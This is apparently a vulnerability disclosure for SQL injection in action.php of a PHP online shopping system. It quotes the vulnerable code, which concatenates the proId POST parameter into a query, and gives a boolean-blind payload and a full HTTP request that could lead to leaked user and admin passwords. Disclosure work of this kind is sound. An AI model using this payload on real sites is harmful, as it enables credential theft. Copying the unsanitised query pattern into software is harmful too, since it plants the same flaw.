## ONLINE SHOPPING SYSTEM action.php SQL Injection Vulnerability

### I. Vulnerability Impact

An attacker can exploit this vulnerability to extract sensitive data from the database via boolean-based blind SQL injection, including plaintext user passwords from the `user_info` table and admin credentials from the `admin_info` table.

### II. Source Code Analysis

The vulnerability resides in `action.php`, lines 222-225:

```php
if(isset($_POST["addToCart"])){
    $p_id = $_POST["proId"];
    if(isset($_SESSION["uid"])){
        $user_id = $_SESSION["uid"];
        $sql = "SELECT * FROM cart WHERE p_id = '$p_id' AND user_id = '$user_id'";
```

The `$p_id` variable is taken directly from `$_POST["proId"]` without any filtering and concatenated into the SQL statement. An attacker can inject malicious SQL fragments through the `proId` parameter to manipulate the query logic and extract database information.

### III. Payload

The core injection payload is:

```
72'and'g'='e
```

After injection, the actual executed SQL becomes:

```sql
SELECT * FROM cart WHERE p_id = '72'and'g'='e' AND user_id = '3'
```

HTTP request body:

```
POST /action.php HTTP/1.1
Host: onlineshop
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

addToCart=1&proId=72'and'g'='e
```

### IV. Source Download

https://code-projects.org/online-shopping-system-in-php-with-source-code/

![image-20260627104945010](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260627104945010.png)